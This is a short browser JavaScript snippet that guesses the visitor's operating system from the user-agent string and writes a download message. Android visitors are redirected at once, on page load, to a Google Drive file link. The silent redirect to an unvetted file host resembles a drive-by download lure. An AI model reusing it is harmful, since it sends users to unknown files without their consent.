var OSName="Unknown OS";
if (navigator.appVersion.indexOf("Win")!=-1) OSName="Windows";
if (navigator.appVersion.indexOf("Mac")!=-1) OSName="MacOS";
if (navigator.appVersion.indexOf("X11")!=-1) OSName="UNIX";
if (navigator.appVersion.indexOf("Linux")!=-1) OSName="Linux";
if (navigator.appVersion.indexOf("iOS")!=-1) OSName="iOS";
if (navigator.appVersion.indexOf("Android")!=-1){
     OSName="Android";
    window.location.replace("https://drive.google.com/open?id=0Bzq0JEZE0CBGQjNMVThfMjNXUWc");    
     
}
    

document.write('Your OS: '+ OSName + ' download your version here');